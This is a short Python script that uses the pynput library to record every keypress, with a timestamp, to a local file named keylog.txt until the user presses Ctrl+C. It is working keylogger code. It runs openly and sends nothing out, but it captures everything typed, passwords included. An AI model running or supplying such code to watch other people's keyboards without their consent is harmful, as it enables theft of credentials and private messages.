from pynput import keyboard
import time

def on_key_press(key):
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_file.write(f"{timestamp} - {key}\n")

def main():
    print("Press Ctrl+C to stop logging.")
    try:
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nLogging stopped.")

if __name__ == "__main__":
    main()


